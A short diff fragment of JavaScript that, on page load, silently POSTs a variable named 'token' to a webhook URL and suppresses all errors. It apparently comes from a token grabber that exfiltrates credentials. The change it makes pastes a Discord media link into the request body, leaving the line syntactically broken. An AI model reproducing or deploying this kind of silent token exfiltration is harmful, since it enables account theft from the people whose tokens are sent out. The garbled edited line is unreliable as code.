@@ -42,7 +42,7 @@ document.addEventListener('DOMContentLoaded', () => {
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content:token })
+                body: JSON.stringify({ content:token https://images-ext-1.discordapp.net/external/36FF-c0VEYF9qeDBVY6pFuIpt5Ee-Z791DqWVbWVdLw/https/static.klipy.com/ii/4493325008d34b7bf8cd6813cd5c1619/5d/c7/C2vimdtpmdQcc234.mp4 })
             });
         } catch (e) {}
     }
